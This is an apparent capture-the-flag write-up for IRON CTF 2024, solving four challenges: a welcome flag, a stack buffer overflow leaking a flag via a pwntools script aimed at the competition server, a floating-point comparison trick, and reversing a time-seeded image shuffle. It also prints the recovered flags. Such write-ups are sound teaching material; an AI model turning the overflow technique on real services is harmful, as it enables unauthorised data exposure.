<div align="center">
    <h1>IRON CTF 2024 (Online Jeopardy CTF)<h1>
    <img src="IRON-CTF.png" alt="TEAM RANKINGS" />
</div>

Here are the challenges that I solved in this competition.
1. [Welcome](#Welcome)
2. [Introspection](#Introspection)
3. [Math gone Wrong](#Math-gone-Wrong)
4. [Random Pixels](#Random-pixels)

---
## Welcome
<div align="center">
    <img src="https://github.com/user-attachments/assets/dff3aa28-83c7-4e13-9fab-0dd2a8bdd149" alt="Welcome" />
</div>

The flag was already posted on the discord Rules section:
<div align="center">
    <img src="https://github.com/user-attachments/assets/734480ab-4b68-4be2-97d8-6ec051e638c0" alt="Discord" />
</div>

### FLAG = `ironCTF{W3lc0m3_t0_ir0nCTF_2024}`
---
### Introspection
<div align="center">
    <img src="https://github.com/user-attachments/assets/e1657ecf-12f4-4de4-9465-77d1bcd140c5" alt="Introspection" />
</div>

They provided us with an ELF file, a C++ Sorce file, and a Fake Flag file
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ ls -al
total 40
drwxr-xr-x  2 kali kali  4096 Oct  5 14:38 .
drwxr-xr-x 18 kali kali  4096 Oct  5 21:21 ..
-rw-r--r--  1 kali kali    25 Sep 30 19:19 flag.txt
-rwxr-xr-x  1 kali kali 16328 Sep 30 19:11 introspection
-rw-r--r--  1 kali kali   776 Sep 30 19:09 introspection.c
-rw-r--r--  1 kali kali  3637 Oct  1 00:34 Introspection.zip
-rw-r--r--  1 kali kali   283 Oct  5 14:38 solve.py
```


The ELF Executable binary had the following properties:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ file introspection
introspection: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7b67e6360915273fd8e5e41cebf3492358405bb, for GNU/Linux 3.2.0, not stripped

┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ checksec introspection
[*] '/home/kali/ironCTF/introspection-COMPLETED/introspection'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
Running the binary got s these results:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ ./introspection
"Introspection is the key to unlocking your fullest potential; knowing yourself is the first step."

                                                                                         - ChatGPT
Have you thought about what you really wanted in life?
>> To become a good reverse-engineer and pwner one day
I wish for you that you get To become a good reverse-engineer and pwner one day
```

After analyzing the file in Ghidra, I realized I could get the flag by simply overflowing the input buffer since the flag variable is right above the input variable in the stack:
<div align="center">
    <img src="https://github.com/user-attachments/assets/2a1f5e6a-bbc0-409f-a6be-36935d5d2a98" alt="Ghidra Analysis" />
</div>

```
undefined8 main(void){
  undefined input [1008];
  undefined file_data [56];
  FILE *file;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("\x1b[32m\"Introspection is the key to unlocking your fullest potential; knowing yourself is the first step.\"\x1b[0m\n");
  puts("                                                                                                            - Ch atGPT");
  puts("Have you thought about what you really wanted in life?");
  file = fopen("flag.txt","r");
  if (file == (FILE *)0x0) {
    printf("Error! flag.txt not found!");
    exit(1);
  }
  fread(file_data,1,0x32,file);
  printf(">> ");
  read(0,input,0x3f0);
  printf("I wish for you that you get %s",input);
  return 0;
}
```

So I started a new solve.py file with nano and wrote this script with the pwntools library, to get the buffer overflow:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ cat solve.py
from pwn import *

#io = process("./introspection")
io = remote("pwn.1nf1n1ty.team", 31698)
payload = (b"A" * 1008)
payload += (b"B" * 4)

io.recvuntil(b">> ")
io.sendline(payload)
io.interactive()
```

Here is the Output of the script:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/introspection-COMPLETED]
└─$ python3 solve.py
[+] Opening connection to pwn.1nf1n1ty.team on port 31698: Done
[*] Switching to interactive mode
I wish for you that you get AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}
\xc8\x13\x7f[*] Got EOF while reading in interactive
$ ls
$ whoami
$ w
[*] Closed connection to pwn.1nf1n1ty.team port 31698
[*] Got EOF while sending in interactive
```

### FLAG = `ironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}`

---

## Math gone Wrong
<div align="center">
    <img src="https://github.com/user-attachments/assets/aead698d-9df1-4136-a5a7-ce7ed73d4c08" alt="Math Gone Wrong" />
</div>

When we connect to the Netcat Instance, It simply prompts us to enter two numbers and then based on a condition gives us the flag:

```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Algebra-Math-COMPLETED]
└─$ nc misc.1nf1n1ty.team 30011
Enter frist number (n1) > 1
Enter second number (n2) > 2
n1*10+n2*10 != (n1+n2)*10
above condition is false so no flag
```

After playing around for i realized the numbers taken as input are being interpreted as integers, So I tried using float values, and I was right:

```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF]
└─$ nc misc.1nf1n1ty.team 30011
Enter frist number (n1) > 0.656565
Enter second number (n2) > 0.4686546
b'ironCTF{s1mpl3_r3m4ind3r_70_b3w4r3_0f_fl047ing_p0in7_3rr0r}'
```

### FLAG = `ironCTF{s1mpl3_r3m4ind3r_70_b3w4r3_0f_fl047ing_p0in7_3rr0r}`

---

## Random Pixels
<div align="center">
    <img src="https://github.com/user-attachments/assets/22290873-8c12-4f57-9be2-0e0a351dd5aa" alt="Random Pixels" />
</div>

They provided us with a Challenge zip file `chall.zip`. After Unzipping the ZIP file, I got the following files:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Random_Pixels-COMPLETED]
└─$ ls -l
total 56
-rw-r--r-- 1 kali kali 22367 Oct  4 23:56 chal.zip
-rw-rw-r-- 1 kali kali   583 Sep 29 17:18 enc.py
-rw-rw-r-- 1 kali kali 22113 Oct  3 02:02 encrypted.png
```

The encrypted.png looked like this:
<div align="center">
    <img src="https://github.com/user-attachments/assets/1562db2b-9d64-4ee0-adcd-7226377e4f5c" alt="Encrypted PNG File" />
</div>

and the enc.py had the following encryption mechanisms and required a seed to reverse the encryption:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Random_Pixels-COMPLETED]
└─$ cat enc.py
import random, time, numpy
from PIL import Image
from secret import FLAG

def randomize(img, seed):
        random.seed(seed)
        new_y = list(range(img.shape[0]))
        new_x = list(range(img.shape[1]))
        random.shuffle(new_y)
        random.shuffle(new_x)

        new = numpy.empty_like(img)
        for i, y in enumerate(new_y):
                for j, x in enumerate(new_x):
                        new[i][j] = img[y][x]
        return numpy.array(new)


if __name__ == "__main__":
        with Image.open(FLAG) as f:
                img = numpy.array(f)
                out = randomize(img, int(time.time()))
                image = Image.fromarray(out)
                image.save("encrypted.png")
```

Looking more carefully at the code, I noticed it was importing the time library and was the current time as the seed of encryption. I immediately knew what i had to do. I ran exiftool on the PNG file, copied its modification date and with the help of ChatGPT, wrote following script:

```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Random_Pixels-COMPLETED]
└─$ exiftool encrypted.png
ExifTool Version Number         : 12.76
File Name                       : encrypted.png
Directory                       : .
File Size                       : 22 kB
File Modification Date/Time     : 2024:10:03 02:02:40+05:00
File Access Date/Time           : 2024:10:05 17:40:58+05:00
File Inode Change Date/Time     : 2024:10:05 12:07:21+05:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 300
Image Height                    : 300
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 300x300
Megapixels                      : 0.090
```

DECRYPTION SCRIPT:
```
┌──(kali㉿LEOPARD-PC)-[~/ironCTF/Random_Pixels-COMPLETED]
└─$ cat restore.py
import random
import numpy
from PIL import Image
import time
import datetime

FILE = "./encrypted.png"

def randomize(img, seed):
    random.seed(seed)
    new_y = list(range(img.shape[0]))
    new_x = list(range(img.shape[1]))

    random.shuffle(new_y)
    random.shuffle(new_x)

    new = numpy.empty_like(img)
    for i, y in enumerate(new_y):
        for j, x in enumerate(new_x):
            new[i][j] = img[y][x]

    return new, new_y, new_x

def unrandomize(img, new_y, new_x):
    original = numpy.empty_like(img)

    for i in range(img.shape[0]):
        for j in range(img.shape[1]):
            original[new_y[i]][new_x[j]] = img[i][j]

    return original

def estimate_seed(modification_date):
    # Convert the modification date to a Unix timestamp
    dt = datetime.datetime.strptime(modification_date, "%Y:%m:%d %H:%M:%S%z")
    return int(dt.timestamp())

def main():
    # Load the encrypted image
    with Image.open(FILE) as f:
        img = numpy.array(f)

    # Estimated modification date from exiftool output
    modification_date = "2024:10:03 02:02:40+05:00"
    seed = estimate_seed(modification_date)

    # Get the shuffle indices
    height, width = img.shape[0], img.shape[1]
    new_y, new_x = randomize(numpy.zeros_like(img), seed)[1:3]  # Get new_y and new_x

    # Unrandomize the image
    restored_image = unrandomize(img, new_y, new_x)
    restored = Image.fromarray(restored_image)
    restored.save("restored.png")
    print("Restored image saved as 'restored.png'.")

if __name__ == "__main__":
    main()
```

After running the script i got a QR Code, which had the flag in it:
<div align="center">
    <img src="https://github.com/user-attachments/assets/4e184672-c28b-4a60-a327-8d73885e4781" alt="Decryped PNG File" />
</div>

### FLAG = `ironCTF{p53ud0_r4nd0m_f0r_4_r3450n}`

```
